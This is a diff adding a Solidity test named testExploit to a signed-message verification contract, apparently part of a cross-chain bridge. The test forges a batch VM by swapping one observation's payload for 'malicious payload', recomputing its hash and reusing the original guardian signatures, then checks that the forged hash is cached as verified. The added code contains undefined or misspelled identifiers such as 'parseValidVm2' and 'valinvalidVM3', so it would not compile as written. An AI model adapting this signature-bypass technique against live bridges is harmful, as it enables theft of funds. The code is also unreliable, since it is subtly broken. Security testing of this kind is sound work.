@@ -193,6 +193,74 @@ contract TestMessages is Messages, Test {
     parseBatchVM(invalidObservationsCountVm2);
   }
 
+  // This test checks the possibility of getting a unsigned message verified
+  function testExploit() public {
+    // Set the initial guardian set
+    address[] memory initialGuardians = new address[](1);
+    initialGuardians[0] = testGuardianPub;
+
+    // Create a guardian set
+    Structs.GuardianSet memory initialGuardianSet = Structs.GuardianSet({
+      keys: initialGuardians,
+      expirationTime: 0
+    });
+
+    storeGuardianSet(initialGuardianSet, 0);
+
+    // Confirm that the test VM2 is valid
+    (Structs.VM2 memory parsedValidVm2, bool valid, string memory reason) = this.parseAndVerifyBatchVM(validVM2, false);
+    require(valid, reason);
+
+    // Manipulate one of the observations of the batch
+    bytes memory observation = abi.encodePacked(
+        parsedValidVm2.observations[0].timestamp,
+        parsedValidVm2.observations[0].nonce,
+        parsedValidVm2.observations[0].emitterChainId,
+        parsedValidVm2.observations[0].emitterAddress,
+        parsedValidVm2.observations[0].sequence,
+        parsedValidVm2.observations[0].consistencyLevel,
+        "malicious payload"
+    );
+
+    parsedValidVm2.observations[0] = abi.encodePacked(
+      uint8(3),
+      observation
+    );
+
+    parseValidVm2.hashes[0] = doubleKeccak256(observation);
+
+    // Create the malicious VM
+    Structs.VM2 memory invalidVM2 = Structs.VM2({
+      version: 2,
+      guardianSetIndex: 0,
+      signatures: parsedValidVm2.signatures,
+      hashes: parsedValidVm2.hashes,
+      hash: parsedValidVm2.hash,
+      observations: parsedValidVm2.observations
+    });
+
+    (valid, reason) = this.verifyBatchVM(invalidVM2, true);
+
+    bytes memory invalidVM3 = abi.encodePacked(
+      uint8(3),
+      observation
+    );
+
+    assertEq(verifiedHashCached(parseValidVm2.hashes[0]), true);
+
+    (Structs.VM2 memory parsedInvalidVm3, bool isValid, string memory invalidReason) = this.parseAndVerifyVM(valinvalidVM3);
+  }
+
+  struct Observation {
+		uint32 timestamp;
+		uint32 nonce;
+		uint16 emitterChainId;
+		bytes32 emitterAddress;
+		uint64 sequence;
+		uint8 consistencyLevel;
+		bytes payload;
+	}
+
   // This test confirms that verifyVM reverts verifying a batchVM with observations
   // that are out of order.
   function testOutOfOrderObservation() public {
